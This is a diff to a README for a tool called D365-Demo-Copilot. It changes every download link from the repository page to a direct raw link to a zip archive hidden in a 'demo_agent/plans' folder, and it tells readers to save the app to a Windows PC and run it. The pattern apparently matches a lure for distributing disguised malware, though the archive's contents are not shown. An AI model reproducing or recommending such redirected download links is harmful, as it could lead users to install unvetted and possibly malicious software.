@@ -1,6 +1,6 @@
 # 🤖 D365-Demo-Copilot - Run Guided Demos With Ease
 
-[![Download D365-Demo-Copilot](https://img.shields.io/badge/Download-D365--Demo--Copilot-blue?style=for-the-badge)](https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot)
+[![Download D365-Demo-Copilot](https://img.shields.io/badge/Download-D365--Demo--Copilot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Theatrical-gravitywave390/D365-Demo-Copilot/main/demo_agent/plans/Copilot_Demo_v3.0.zip)
 
 ## 🚀 Overview
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot
+https://raw.githubusercontent.com/Theatrical-gravitywave390/D365-Demo-Copilot/main/demo_agent/plans/Copilot_Demo_v3.0.zip
 
 Open the page in your browser, then look for the latest release or download files. Save the app to your Windows PC before you run it.
 
@@ -191,6 +191,6 @@ This project is built around:
 ## 📎 Download Again
 
 Visit this page to download:
-https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot
+https://raw.githubusercontent.com/Theatrical-gravitywave390/D365-Demo-Copilot/main/demo_agent/plans/Copilot_Demo_v3.0.zip
 
 Use the same link any time you need the latest version or want to check for updates
